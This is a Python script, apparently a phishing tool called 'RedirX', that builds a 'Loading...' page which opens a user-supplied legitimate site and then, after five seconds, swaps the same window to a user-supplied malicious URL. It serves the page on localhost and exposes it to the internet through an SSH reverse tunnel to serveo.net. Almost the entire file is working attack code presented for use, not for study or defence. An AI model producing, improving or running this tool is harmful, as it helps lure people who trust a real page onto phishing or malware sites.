import os
import http.server
import socketserver
import subprocess
import threading

# Clear the screen
os.system('cls' if os.name == 'nt' else 'clear')

# RedirX Banner in light red style
banner = '''
\033[91m  
      ██▀███  ▓█████ ▓█████▄  ██▓ ██▀███  ▒██   ██▒
     ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▓██ ▒ ██▒▒▒ █ █ ▒░
     ▓██ ░▄█ ▒▒███   ░██   █▌▒██▒▓██ ░▄█ ▒░░  █   ░
     ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██░▒██▀▀█▄   ░ █ █ ▒ 
     ░██▓ ▒██▒░▒████▒░▒████▓ ░██░░██▓ ▒██▒▒██▒ ▒██▒
     ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░▒▒ ░ ░▓ ░
       ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░░░   ░▒ ░
       ░░   ░    ░    ░ ░  ░  ▒ ░  ░░   ░  ░    ░  
        ░        ░  ░   ░     ░     ░      ░    ░  
                       ░                             \033[0m
'''

# Print the light red banner
print(banner)

# Print the "Coded by RedirX" message in green
print("\033[92m             RedirX Coded by Anonycodexia\033[0m")

print("")

# Prompt for URLs
legit_url = input("Enter the legitimate website URL: ")
malicious_url = input("Enter the malicious website URL: ")

# HTML content with the button removed
html_content = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        window.onload = function() {{
            var windowJack = function() {{
                window.open('{legit_url}', 'test');  // Open the legitimate URL
                setTimeout(function() {{
                    window.open('{malicious_url}', 'test');  // Open the malicious URL after 5 seconds
                }}, 5000);
            }};
            windowJack(); // Execute the function on page load
        }};
    </script>
</head>
<body>
    <h1 style="text-align: center; font-family: Arial, sans-serif;">Loading...</h1>
</body>
</html>
'''

# Simple HTTP server to serve the HTML
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
        else:
            super().do_GET()

# Run server on localhost at port 8000
def run_server():
    with socketserver.TCPServer(("localhost", 8000), MyHandler) as httpd:
        print("Serving at http://localhost:8000")
        httpd.serve_forever()

# Function to start the Serveo SSH tunnel
def start_serveo():
    print("Starting SSH tunnel to serveo.net...")
    subprocess.run(['ssh', '-R', '80:localhost:8000', 'serveo.net'])

if __name__ == '__main__':
    # Start the HTTP server in a new thread
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True  # Ensure it exits when the main program exits
    server_thread.start()

    # Start the Serveo tunnel
    start_serveo()
